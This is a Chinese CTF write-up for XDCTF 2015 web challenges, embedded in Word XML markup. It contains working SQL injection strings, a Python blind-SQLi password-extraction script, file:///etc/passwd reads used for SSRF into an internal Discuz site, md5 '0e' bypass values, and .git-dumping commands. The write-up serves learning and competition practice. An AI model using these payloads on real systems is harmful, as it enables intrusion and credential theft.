        <w:t>-100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index.php后加~   得到源码   在线php解密 解一下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2" o:spid="_x0000_s1034" type="#_x0000_t75" style="height:169.9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得到源码。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3" o:spid="_x0000_s1035" type="#_x0000_t75" style="height:131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分析源码 问题的关键在于  md5($str) == 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’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根据php特性可知  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0e1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== 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  0exxx就是科学计数法 0乘以十的xx次方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所以只需找到一个开头为0e的md5值  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google之  md5 0e 找到。</w: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4" o:spid="_x0000_s1036" type="#_x0000_t75" style="height:236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5" o:spid="_x0000_s1037" type="#_x0000_t75" style="height:186.3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widowControl/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 xml:space="preserve">240610708 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/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 xml:space="preserve">QNKCDZO </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/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  <w:t xml:space="preserve">aabg7XSs </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/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都可用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:widowControl/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STSong"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:pict>
          <v:shape id="图片 6" o:spid="_x0000_s1038" type="#_x0000_t75" style="height:154.4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提交getflag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eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>EB1-200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打开后 查看源码发现登录接口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7" o:spid="_x0000_s1039" type="#_x0000_t75" style="height:199.2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提示不是管理员，抓包也没发现什么</w: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8" o:spid="_x0000_s1040" type="#_x0000_t75" style="height:137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队友扫了一下 发现session设置文件，Apache Tomcat 样例目录 SESSION 控制漏洞。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路径：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instrText xml:space="preserve"> HYPERLINK "http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample" </w:instrTex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http://flagbox-23031374.xdctf.win:1234/examples/servlets/servlet/SessionExample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9" o:spid="_x0000_s1041" type="#_x0000_t75" style="height:294.9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继而各种测试，发现user=administrator 后页面有了新变化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10" o:spid="_x0000_s1042" type="#_x0000_t75" style="height:201.7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继续测试 当login=true时 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11" o:spid="_x0000_s1043" type="#_x0000_t75" style="height:217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登录进去 getflag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eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>EB1-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN"/>
        </w:rPr>
        <w:t>300</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/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开始尝试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instrText xml:space="preserve">HYPERLINK "/etc/passwd" </w:instrTex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file:///etc/passwd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，可以读取本地文件，读取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instrText xml:space="preserve">HYPERLINK "/etc/hosts" </w:instrTex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file:///etc/hosts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后，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3" o:spid="_x0000_s1044" type="#_x0000_t75" style="height:8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 xml:space="preserve"> 说明9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com为内网地址，后来发现可以借助服务器连接到其他网络。于是猜想可能是SSRF，借助服务器访问内网服务。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instrText xml:space="preserve">HYPERLINK "http://133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com" </w:instrTex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http://133.130.90.188/?link=http://9bd5688225d90ff2a06e2ee1f1665f40.xdctf.com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13"/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 xml:space="preserve">访问后面出现了一个1，说明内网可能有服务。查看开放的端口，在3389发现一个Discuz! ，版本是7.2。搜索7.2的漏洞。在faq.php有注入漏洞。随便搜一个网页有payload </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:tabs>
          <w:tab w:val="clear" w:pos="916"/>
        </w:tabs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instrText xml:space="preserve">HYPERLINK "http://www.jb51.net/article/53301.htm然后爆出flag" </w:instrTex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>http://www.jb51.net/article/53301.htm然后爆出flag</w:t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t xml:space="preserve"> XDCTF{bf127a6ae4e2_ssrf_to_sqli}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia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WEB1-400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先打开页面，大概看了看 没有发现什么， 查看源代码，也没有什么异常，但是发现图片是php渲染出来的，既然是php 就访问看看有什么东西没， 访问就是一张图片，抓包之 发现源码最后有html注释标记，</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default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TSong" w:cs="Times New Roman"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:pict>
          <v:shape id="图片 1" o:spid="_x0000_s1045" type="#_x0000_t75" style="height:203.9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继而用给的参数去访问，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ID=select1  ===》正常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ID=asdfas(随便打)1 ===&gt;不正常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ID=1e0000(数字1)  ===&gt;正常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这里感觉是sqli，但是当时没有做出来。访问了ID=1......n  也没发现什么。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看到官方hint后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ID= 2" or "1"="1  ===》正常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ID= 2" or "1"="2 ===&gt; 不返回图片</w:t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确认sqli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2" or username is not null%23 =》正常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 xml:space="preserve"> 2" or password is not null%23 =》正常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当前表里有username 和password字段，并且过滤了很多字符串操作函数和select union and.....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找到没过滤的字符串函数 写个脚本提取一下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#encoding = utf-8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import requests,urllib,time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key = '';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payload = '';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for index in range(1,21):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#这里的循环次数是通过length函数得到用户名和密码的长度的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for i in range(0,128):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if i == 0 or i==31 or i == 127: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continue;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char = chr(i);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payload += char;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url = 'http://133.130.90.172/47bce5c74f589f4867dbd57e9ca9f808/Picture.php?ID='+'2" or LPAD(password,'+str(index)+',"*") = "'+payload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try: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c = requests.get(url);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except Exception,e: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print 'Error!!!!!',i,e;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continue;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print url;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if len(c.content)&gt;500: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key += char;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print char;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break;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else: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 xml:space="preserve">            payload = payload[:-1];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pP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/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
          <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
        </w:rPr>
        <w:t>print 'the key is ',payload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得到账号 ：admin 密码：5832f4251cb6f43917df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  <w:t>去前三后一 解密，登录后getflag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia" w:ascii="Times New Roman" w:hAnsi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WEB2-100：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执行以下几条命令：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./rip-git.pl -v -u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"http://xdsec-cms-12023458.xdctf.win/.git/"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http://xdsec-cms-12023458.xdctf.win/.git/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/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reset --hard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl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checkout 16249aa^</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>得到网站源文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default"/>
        </w:rPr>
        <w:t>在index.php中可以得到flag:XDCTF-{raGWvWahqZjww4RdHN90}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="14"/>
        <w:widowControl/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia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BFF55CD"/>
    <w:rsid w:val="38DF8941"/>
    <w:rsid w:val="3C760005"/>
    <w:rsid w:val="6F53265A"/>
    <w:rsid w:val="6F5F2A99"/>
    <w:rsid w:val="7BAF4087"/>
    <w:rsid w:val="BBFD0586"/>
    <w:rsid w:val="BBFF55CD"/>
    <w:rsid w:val="D6F6F8FA"/>
    <w:rsid w:val="E7F706E8"/>
    <w:rsid w:val="FD3FC6E3"/>
    <w:rsid w:val="FDED7B3C"/>
    <w:rsid w:val="FFEB966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TSong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TSong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uiPriority w:val="0"/>
    <w:pPr>
      <w:spacing w:before="0" w:beforeAutospacing="1" w:after="0" w:afterAutospacing="1"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:hint="eastAsia" w:ascii="STSong" w:hAnsi="STSong" w:eastAsia="STSong" w:cs="STSong"/>
      <w:b/>
      <w:kern w:val="0"/>
      <w:sz w:val="27"/>
      <w:szCs w:val="27"/>
      <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA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5">
    <w:name w:val="Default Paragraph Font"/>
    <w:uiPriority w:val="0"/>
  </w:style>
  <w:style w:type="table" w:default="1" w:styleId="18">
    <w:name w:val="Normal Table"/>
    <w:semiHidden/>
    <w:uiPriority w:val="0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TSong" w:hAnsi="STSong" w:eastAsia="STSong" w:cs="STSong"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA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TSong" w:cs="Times New Roman"/>
      <w:kern w:val="0"/>
      <w:sz w:val="24"/>
      <w:szCs w:val="24"/>
      <w:lang w:val="en-US" w:eastAsia="zh-CN" w:bidi="ar-SA"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="16">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="15"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3915-11-04T03:17:00Z</dcterms:created>
  <dc:creator>archstacker</dc:creator>
  <cp:lastModifiedBy>archstacker</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2015-10-03T21:29:01Z</dcterms:modified>
  <dc:title>MISC100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